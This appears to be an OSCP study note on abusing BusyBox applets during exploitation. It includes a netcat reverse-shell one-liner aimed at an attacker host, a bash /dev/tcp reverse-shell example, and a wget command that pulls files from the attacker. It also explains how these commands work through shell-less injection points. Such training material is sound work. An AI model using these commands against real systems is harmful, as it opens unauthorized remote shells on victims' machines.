# BusyBox — One Binary, Many Tools (OSCP)

BusyBox bundles ~300 stripped-down Unix utilities (`sh`, `nc`, `wget`, `ls`, `cat`, `telnet`…) into a **single executable**. Common on embedded/IoT, routers, Alpine Linux, and minimal Docker containers — sometimes the *entire* userland.

**Not guaranteed on full distros** (Kali, Ubuntu, RHEL) — but always worth checking, because it hands you tools the stock system may have stripped (like `nc -e`).

---

## Check If It's There

```bash
which busybox      # get the path
busybox            # list every applet compiled into this build
```

Invoke any applet directly, even with no symlink set up:
```bash
busybox <applet> <args>     # e.g. busybox wget http://...
```

---

## Reverse Shell (the OSCP win)

BusyBox's `nc` keeps the `-e` flag that modern OpenBSD `nc` removed:

```bash
busybox nc <KALI_IP> <PORT> -e /bin/sh
```

Single binary + plain space-separated args, **zero shell metacharacters** — so it works even in a **shell-less exec context** (Java `Runtime.exec()`, some RCE sinks) where `bash -i >& /dev/tcp/...` fails.

---

## Why It Wins in Shell-less RCE

Some injection points (e.g. a Java plugin) run your command via direct-exec, which **splits on whitespace and ignores quotes** — there is no shell to interpret anything. That breaks:

| Fails | Reason |
|-------|--------|
| `echo ...` | often a shell **builtin**, no shell = no builtin |
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | `>&`, `/dev/tcp/`, redirects are **bash syntax** — need bash to parse them |
| `sh -c "bash -i >& ..."` | **quotes don't survive** whitespace tokenizing — the `"..."` never groups |
| pipes `\|`, `;`, `&&`, `$(...)` | all shell metacharacters — meaningless without a shell |

Rule of thumb: in a shell-less context your payload must be **one binary + plain args**. `busybox nc IP PORT -e /bin/sh` fits perfectly.

---

## Other Handy Applets

```bash
busybox wget http://<KALI_IP>/file -O /tmp/file    # file transfer
busybox telnet <IP> <PORT>                         # banner grab / manual proto
busybox sh                                          # drop into a shell
```

> BusyBox applets are **feature-reduced** — fewer flags than GNU versions. If a flag errors, check `busybox <applet> --help`.

---

## Related Notes

- [[Netcat]]
- [[ReverseShells]]
- [[Malicious_Plugin_Upload]]
